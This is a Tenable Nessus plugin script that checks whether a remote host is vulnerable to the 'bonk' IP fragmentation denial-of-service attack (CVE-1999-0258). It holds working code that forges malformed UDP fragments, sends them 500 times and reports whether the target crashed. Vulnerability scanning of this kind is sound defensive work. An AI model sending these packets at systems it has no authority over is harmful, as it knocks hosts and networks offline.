#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10030);
 script_version ("$Revision: 1.28 $");
 script_cve_id("CVE-1999-0258");
 script_xref(name:"OSVDB", value:"5730");
 script_name(english:"TCP/IP IP Fragmentation Remote DoS (bonk)");
 script_summary(english:"Crashes the remote host using the 'bonk' attack");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "The operating system on the remote host has a denial of service\n",
     "vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "It was possible to make the remote server crash using the 'bonk'\n",
     "attack.  This is due to a design flaw in the remote operating\n",
     "system's TCP/IP implementation.\n\n",
     "An attacker may use this flaw to shut down this server, thus\n",
     "preventing the network from working properly."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://marc.info/?l=bugtraq&m=88429524325956&w=2"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Contact the operating system vendor for a patch."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C"
 );
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_family(english:"Denial of Service");
 
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_require_keys("Settings/ParanoidReport");
 
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");

if (report_paranoia < 2) exit(0);

if ( TARGET_IS_IPV6 ) exit(0);
if(islocalhost())exit(0);
start_denial();


PADDING = 0x1c;
FRG_CONST = 0x3;
sport = 123;
dport = 321;

addr = this_host();

ip = forge_ip_packet(ip_v  	: 4, 
		     ip_hl 	: 5,
		     ip_len 	: 20 + 8 + PADDING,
		     ip_id 	: 0x455,
		     ip_p 	: IPPROTO_UDP,
		     ip_tos	: 0,
		     ip_ttl 	: 0x40,
		     ip_off 	: IP_MF,
		     ip_src	: addr);

udp1 = forge_udp_packet( ip 	: ip, uh_sport: sport, uh_dport: dport,
			 uh_ulen : 8 + PADDING, data:crap(PADDING));
			 
ip = set_ip_elements(ip : ip, ip_off : FRG_CONST + 1, ip_len : 20 + FRG_CONST);

udp2 = forge_udp_packet(ip : ip,uh_sport : sport, uh_dport : dport,
			uh_ulen : 8 + PADDING, data:crap(PADDING));
			
send_packet(udp1, udp2, pcap_active:FALSE) x 500;						 
sleep(7);  # got false +ves at 5 seconds.
alive = end_denial();
if(!alive){
                set_kb_item(name:"Host/dead", value:TRUE);
                security_hole(port:0, protocol:"udp");
                }
